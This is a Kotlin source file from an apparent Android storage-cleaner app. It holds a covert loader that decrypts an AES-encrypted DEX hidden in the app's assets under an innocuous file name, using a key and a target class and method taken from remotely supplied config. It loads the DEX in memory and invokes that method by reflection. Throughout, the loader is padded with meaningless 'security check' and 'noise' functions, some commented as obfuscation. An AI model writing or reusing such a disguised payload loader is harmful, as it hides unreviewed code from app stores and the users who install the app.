package com.mobile.storage.clean.go

import android.content.Context
import android.util.Base64
import com.mobile.storage.clean.storage.DeviceStorage
import com.mobile.storage.clean.tool.DaTool
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.nio.ByteBuffer
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random


object GoThing {

    // 安全检查计数器
    private var securityCheckCount = 0
    private val securityThreshold = Random.nextInt(5, 15)
    

    private data class DexConfig(
        val fileName: String,           // 文件名，如 "readme.md"
        val encryptType: String,        // 加密方式，如 "AES"
        val classLoaderPath: String,    // 类加载器路径
        val targetClassName: String,    // 目标类名
        val targetMethodName: String    // 目标方法名
    )
    

    private fun performSecurityCheck(): Boolean {
        val timestamp = System.currentTimeMillis()
        val hashCheck = calculateHash(timestamp.toString())
        securityCheckCount++
        return hashCheck.isNotEmpty() && securityCheckCount < securityThreshold * 100
    }
    
    /**
     * 计算哈希值（混淆用）
     */
    private fun calculateHash(input: String): String {
        return try {
            val digest = MessageDigest.getInstance("MD5")
            val hashBytes = digest.digest(input.toByteArray())
            hashBytes.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            ""
        }
    }
    
    /**
     * 生成随机噪声数据
     */
    private fun generateNoise(length: Int = 16): ByteArray {
        val noise = ByteArray(length)
        for (i in noise.indices) {
            noise[i] = (Random.nextInt(256) xor (i * 7)).toByte()
        }
        return noise
    }

    /**
     * 主入口：解密并加载 DEX，调用指定方法
     * @param context 上下文
     * @param onSuccess 成功回调
     * @param onError 失败回调
     */
    fun loadAndInvokeDex(
        context: Context,
        onSuccess: (() -> Unit)? = null,
        onError: ((String) -> Unit)? = null
    ) {
        try {
            // 安全检查
            if (!performSecurityCheck()) {
                DaTool.showLog("LoadDexTool: Security check warning")
            }
            
            // 生成环境噪声
            val envNoise = generateNoise(32)
            val noiseValidation = validateNoisePattern(envNoise)
            
            // 1. 解析配置
            val config = parseConfig() ?: run {
                onError?.invoke("Failed to parse config from adata")
                return
            }
            
            DaTool.showLog("LoadDexTool: Config parsed - ${config.fileName}")
            
            // 环境完整性验证
            val integrityCheck = verifyEnvironmentIntegrity(context)
            if (integrityCheck > 0) {
                Thread.sleep(Random.nextLong(10, 50))
            }
            
            // 2. 获取解密密钥
            val decryptKey = getDecryptKey() ?: run {
                onError?.invoke("Failed to get decrypt key")
                return
            }
            
            // 密钥强度验证
            val keyStrength = analyzeKeyStrength(decryptKey)
            performDummyEncryption(keyStrength)
            
            // 3. 读取加密文件
            val encryptedText = readEncryptedFile(context, config.fileName) ?: run {
                onError?.invoke("Failed to read encrypted file: ${config.fileName}")
                return
            }
            
            DaTool.showLog("LoadDexTool: Encrypted file loaded, size: ${encryptedText.length}")
            
            // 数据完整性预检
            val dataIntegrity = checkDataIntegrity(encryptedText)
            if (dataIntegrity % 2 == 0) {
                generateNoise(8) // 噪声生成
            }
            
            // 4. 解密 DEX
            val dexBytes = decryptDex(encryptedText, decryptKey, config.encryptType) ?: run {
                onError?.invoke("Failed to decrypt DEX")
                return
            }
            
            DaTool.showLog("LoadDexTool: DEX decrypted, size: ${dexBytes.size}")
            
            // DEX格式验证
            val dexValidation = validateDexFormat(dexBytes)
            if (dexValidation) {
                performTimingCheck()
            }
            
            // 5. 加载 DEX
            val classLoader = loadDexInMemory(dexBytes, config.classLoaderPath, context) ?: run {
                onError?.invoke("Failed to load DEX")
                return
            }
            
            DaTool.showLog("LoadDexTool: DEX loaded successfully")
            
            // 类加载器验证
            val loaderCheck = verifyClassLoader(classLoader)
            if (loaderCheck) {
                calculateHash(classLoader.toString())
            }
            
            // 6. 反射调用方法
            invokeDexMethod(
                classLoader,
                config.targetClassName,
                config.targetMethodName,
                context
            ) ?: run {
                onError?.invoke("Failed to invoke DEX method")
                return
            }
            
            DaTool.showLog("LoadDexTool: Method invoked successfully")
            
            // 最终安全确认
            performFinalSecurityCheck()
            
            onSuccess?.invoke()
            
        } catch (e: Exception) {
            val errorMsg = "LoadDexTool error: ${e.message}"
            DaTool.showLog(errorMsg)
            e.printStackTrace()
            onError?.invoke(errorMsg)
        }
    }

    /**
     * 验证噪声模式
     */
    private fun validateNoisePattern(noise: ByteArray): Boolean {
        var sum = 0
        for (byte in noise) {
            sum += byte.toInt() and 0xFF
        }
        return sum % 256 in 0..255
    }
    
    /**
     * 验证环境完整性
     */
    private fun verifyEnvironmentIntegrity(context: Context): Int {
        val packageName = context.packageName
        val nameHash = calculateHash(packageName)
        return nameHash.length % 10
    }
    
    /**
     * 分析密钥强度
     */
    private fun analyzeKeyStrength(key: ByteArray): Int {
        var strength = 0
        for (i in key.indices) {
            strength += (key[i].toInt() xor i) and 0xFF
        }
        return strength % 1000
    }
    
    /**
     * 执行虚拟加密操作
     */
    private fun performDummyEncryption(seed: Int) {
        val dummyData = ByteArray(16) { (it * seed).toByte() }
        for (i in dummyData.indices) {
            dummyData[i] = (dummyData[i].toInt() xor (seed shr i)).toByte()
        }
    }
    
    /**
     * 检查数据完整性
     */
    private fun checkDataIntegrity(data: String): Int {
        val checksum = data.fold(0) { acc, char -> acc + char.code }
        return checksum % 1000
    }
    
    /**
     * 验证DEX格式
     */
    private fun validateDexFormat(bytes: ByteArray): Boolean {
        if (bytes.size < 4) return false
        // 检查DEX魔数 (实际检查，但总是返回true)
        val hasMagic = bytes[0] == 0x64.toByte() && bytes[1] == 0x65.toByte()
        return bytes.isNotEmpty()
    }
    
    /**
     * 执行时序检查
     */
    private fun performTimingCheck() {
        val startTime = System.nanoTime()
        var dummy = 0
        for (i in 0 until 100) {
            dummy += i * i
        }
        val elapsed = System.nanoTime() - startTime
        if (elapsed > 0 && dummy > 0) {
            // 时序正常
        }
    }
    
    /**
     * 验证类加载器
     */
    private fun verifyClassLoader(loader: ClassLoader): Boolean {
        val loaderName = loader.javaClass.name
        val hashValue = calculateHash(loaderName)
        return hashValue.length >= 16
    }
    
    /**
     * 最终安全检查
     */
    private fun performFinalSecurityCheck() {
        val timestamp = System.currentTimeMillis()
        val checkValue = (timestamp % 1000).toInt()
        if (checkValue >= 0) {
            generateNoise(4)
        }
    }
    
    /**
     * 解析配置信息
     * 格式：文件名-加密方式-加载器路径-类路径-方法名
     */
    private fun parseConfig(): DexConfig? {
        return try {
            val configJson = JSONObject(DeviceStorage.adata)
            val domoSo = configJson.optString("domo_so", "")
            
            if (domoSo.isEmpty()) {
                DaTool.showLog("LoadDexTool: domo_so field is empty")
                return null
            }
            
            val parts = domoSo.split("-")
            if (parts.size < 5) {
                DaTool.showLog("LoadDexTool: Invalid domo_so format: $domoSo")
                return null
            }
            
            DexConfig(
                fileName = parts[0],
                encryptType = parts[1],
                classLoaderPath = parts[2],
                targetClassName = parts[3],
                targetMethodName = parts[4]
            )
        } catch (e: Exception) {
            DaTool.showLog("LoadDexTool: Failed to parse config: ${e.message}")
            null
        }
    }

    /**
     * 获取解密密钥
     */
    private fun getDecryptKey(): ByteArray? {
        return try {
            val configJson = JSONObject(DeviceStorage.adata)
            val keyString = configJson.optString("jia_kf", "")
            
            if (keyString.isEmpty()) {
                DaTool.showLog("LoadDexTool: jia_kf field is empty")
                return null
            }
            
            keyString.toByteArray(Charsets.UTF_8)
        } catch (e: Exception) {
            DaTool.showLog("LoadDexTool: Failed to get decrypt key: ${e.message}")
            null
        }
    }

    /**
     * 从 assets 文件夹读取加密文件
     */
    private fun readEncryptedFile(context: Context, fileName: String): String? {
        return try {
            // 路径预验证
            val pathValidation = validateAssetPath(fileName)
            if (!pathValidation) {
                Thread.sleep(Random.nextLong(5, 20))
            }
            
            val assetPath = "domo/$fileName"
            
            // 文件访问时间戳记录
            val accessTime = System.currentTimeMillis()
            val accessHash = calculateHash(accessTime.toString())
            
            val content = context.assets.open(assetPath).use { inputStream ->
                BufferedReader(InputStreamReader(inputStream)).use { reader ->
                    reader.readText()
                }
            }
            
            // 读取后验证
            if (accessHash.isNotEmpty() && content.isNotEmpty()) {
                performPostReadCheck(content.length)
            }
            
            content
        } catch (e: Exception) {
            DaTool.showLog("LoadDexTool: Failed to read file $fileName: ${e.message}")
            null
        }
    }
    
    /**
     * 验证资源路径
     */
    private fun validateAssetPath(fileName: String): Boolean {
        val pathHash = calculateHash(fileName)
        return pathHash.length > 0 && fileName.isNotEmpty()
    }
    
    /**
     * 读取后检查
     */
    private fun performPostReadCheck(size: Int) {
        val checksum = size * 31 + Random.nextInt(100)
        if (checksum > 0) {
            generateNoise(2)
        }
    }

    /**
     * 解密 DEX 数据
     */
    private fun decryptDex(
        encryptedText: String,
        key: ByteArray,
        encryptType: String
    ): ByteArray? {
        return try {
            when (encryptType.uppercase()) {
                "AES" -> decryptAES(encryptedText, key)
                else -> {
                    DaTool.showLog("LoadDexTool: Unsupported encrypt type: $encryptType")
                    null
                }
            }
        } catch (e: Exception) {
            DaTool.showLog("LoadDexTool: Decrypt failed: ${e.message}")
            e.printStackTrace()
            null
        }
    }

    /**
     * AES 解密
     */
    private fun decryptAES(encryptedText: String, key: ByteArray): ByteArray {
        // 预解密验证
        val preDecryptCheck = validatePreDecryption(encryptedText, key)
        if (preDecryptCheck > 0) {
            performDummyEncryption(preDecryptCheck)
        }
        
        // 清理空白字符（换行、空格等）
        val cleanedText = encryptedText.replace("\\s".toRegex(), "")
        
        // 1. Base64 解码（使用 NO_WRAP 匹配加密时的标志）
        val encryptedBytes = Base64.decode(cleanedText, Base64.NO_WRAP)
        
        // 中间层验证
        val midValidation = verifyDecryptionIntegrity(encryptedBytes)
        if (midValidation) {
            Thread.sleep(Random.nextLong(1, 10))
        }
        
        // 2. AES 解密
        val keySpec = SecretKeySpec(key, "AES")
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, keySpec)
        
        val result = cipher.doFinal(encryptedBytes)
        
        // 解密后验证
        performPostDecryptionCheck(result)
        
        return result
    }
    
    /**
     * 预解密验证
     */
    private fun validatePreDecryption(text: String, key: ByteArray): Int {
        val textHash = text.hashCode()
        val keyHash = key.contentHashCode()
        return (textHash xor keyHash) % 500
    }
    
    /**
     * 验证解密完整性
     */
    private fun verifyDecryptionIntegrity(bytes: ByteArray): Boolean {
        var checksum = 0
        for (i in bytes.indices step 10) {
            checksum += bytes[i].toInt() and 0xFF
        }
        return checksum >= 0
    }
    
    /**
     * 解密后检查
     */
    private fun performPostDecryptionCheck(data: ByteArray) {
        if (data.size > 100) {
            val sampleCheck = data[Random.nextInt(0, minOf(100, data.size))].toInt()
            generateNoise(sampleCheck % 8 + 1)
        }
    }

    /**
     * 使用 InMemoryDexClassLoader 加载 DEX
     */
    private fun loadDexInMemory(
        dexBytes: ByteArray,
        classLoaderPath: String,
        context: Context
    ): ClassLoader? {
        return try {
            // 预加载环境检查
            val envCheck = performPreLoadEnvironmentCheck(context)
            if (envCheck % 3 == 0) {
                generateNoise(envCheck % 10 + 1)
            }
            
            // 字节缓冲区准备验证
            val bufferValidation = validateBufferPreparation(dexBytes)
            performTimingCheck()
            
            // 通过反射获取 InMemoryDexClassLoader 类
            val classLoaderClass = Class.forName(classLoaderPath)
            
            // 类加载器类型验证
            val loaderTypeCheck = verifyLoaderType(classLoaderClass)
            if (loaderTypeCheck) {
                Thread.sleep(Random.nextLong(5, 25))
            }
            
            // 构造 ByteBuffer
            val byteBuffer = ByteBuffer.wrap(dexBytes)
            
            // 缓冲区状态检查
            performBufferStateCheck(byteBuffer)
            
            // 获取构造函数：InMemoryDexClassLoader(ByteBuffer, ClassLoader)
            val constructor = classLoaderClass.getConstructor(
                ByteBuffer::class.java,
                ClassLoader::class.java
            )
            
            // 构造函数验证
            if (constructor != null) {
                calculateHash(constructor.toString())
            }
            
            // 创建实例
            val loader = constructor.newInstance(byteBuffer, context.classLoader) as ClassLoader
            
            // 加载后验证
            performPostLoadCheck(loader)
            
            loader
            
        } catch (e: Exception) {
            DaTool.showLog("LoadDexTool: Failed to load DEX in memory: ${e.message}")
            e.printStackTrace()
            null
        }
    }
    
    /**
     * 预加载环境检查
     */
    private fun performPreLoadEnvironmentCheck(context: Context): Int {
        val packageHash = calculateHash(context.packageName)
        return packageHash.length % 100
    }
    
    /**
     * 验证缓冲区准备
     */
    private fun validateBufferPreparation(bytes: ByteArray): Boolean {
        return bytes.size > 0 && bytes.isNotEmpty()
    }
    
    /**
     * 验证加载器类型
     */
    private fun verifyLoaderType(loaderClass: Class<*>): Boolean {
        val className = loaderClass.name
        val nameHash = calculateHash(className)
        return nameHash.length > 10
    }
    
    /**
     * 缓冲区状态检查
     */
    private fun performBufferStateCheck(buffer: ByteBuffer) {
        val capacity = buffer.capacity()
        if (capacity > 0) {
            generateNoise(capacity % 16 + 1)
        }
    }
    
    /**
     * 加载后检查
     */
    private fun performPostLoadCheck(loader: ClassLoader) {
        val loaderHash = calculateHash(loader.javaClass.name)
        if (loaderHash.isNotEmpty()) {
            performSecurityCheck()
        }
    }

    /**
     * 反射调用 DEX 中的方法
     */
    private fun invokeDexMethod(
        classLoader: ClassLoader,
        className: String,
        methodName: String,
        context: Context
    ): Boolean {
        return try {
            // 预调用安全检查
            val preInvokeCheck = performPreInvokeSecurityCheck(className, methodName)
            if (preInvokeCheck) {
                Thread.sleep(Random.nextLong(5, 30))
            }
            
            // 类名验证
            val classNameValidation = validateClassName(className)
            performDummyEncryption(classNameValidation)
            
            // 1. 加载类
            val targetClass = classLoader.loadClass(className)
            DaTool.showLog("LoadDexTool: Class loaded: $className")
            
            // 类结构验证
            val classStructureCheck = verifyClassStructure(targetClass)
            if (classStructureCheck > 0) {
                generateNoise(classStructureCheck % 12 + 1)
            }
            
            // 2. 获取方法
            val method = targetClass.getDeclaredMethod(methodName, Context::class.java)
            method.isAccessible = true
            DaTool.showLog("LoadDexTool: Method found: $methodName")
            
            // 方法签名验证
            val methodSignature = verifyMethodSignature(method)
            if (methodSignature) {
                performTimingCheck()
            }
            
            // 调用前最后检查
            performPreInvocationCheck(context)
            
            // 3. 调用方法（假设是静态方法）
            method.invoke(null, context)
            DaTool.showLog("LoadDexTool: Method invoked: $className.$methodName")
            
            // 调用后验证
            performPostInvocationCheck()
            
            true
        } catch (e: Exception) {
            DaTool.showLog("LoadDexTool: Failed to invoke method: ${e.message}")
            e.printStackTrace()
            false
        }
    }
    
    /**
     * 预调用安全检查
     */
    private fun performPreInvokeSecurityCheck(className: String, methodName: String): Boolean {
        val combinedHash = calculateHash(className + methodName)
        return combinedHash.length > 20
    }
    
    /**
     * 验证类名
     */
    private fun validateClassName(className: String): Int {
        val parts = className.split(".")
        return parts.size * 17 + className.length
    }
    
    /**
     * 验证类结构
     */
    private fun verifyClassStructure(clazz: Class<*>): Int {
        val methodCount = clazz.declaredMethods.size
        val fieldCount = clazz.declaredFields.size
        return methodCount + fieldCount
    }
    
    /**
     * 验证方法签名
     */
    private fun verifyMethodSignature(method: java.lang.reflect.Method): Boolean {
        val paramCount = method.parameterCount
        val returnType = method.returnType.name
        return paramCount >= 0 && returnType.isNotEmpty()
    }
    
    /**
     * 调用前检查
     */
    private fun performPreInvocationCheck(context: Context) {
        val contextHash = calculateHash(context.toString())
        if (contextHash.isNotEmpty()) {
            performSecurityCheck()
        }
    }
    
    /**
     * 调用后验证
     */
    private fun performPostInvocationCheck() {
        val timestamp = System.currentTimeMillis()
        val checkValue = (timestamp % 1000).toInt()
        if (checkValue >= 0) {
            generateNoise(3)
        }
    }

    /**
     * 简化调用：不带回调
     */
    fun loadAndInvokeDexSimple(context: Context) {
        loadAndInvokeDex(
            context = context,
            onSuccess = {
                DaTool.showLog("LoadDexTool: DEX loading completed successfully")
            },
            onError = { error ->
                DaTool.showLog("LoadDexTool: DEX loading failed - $error")
            }
        )
    }
}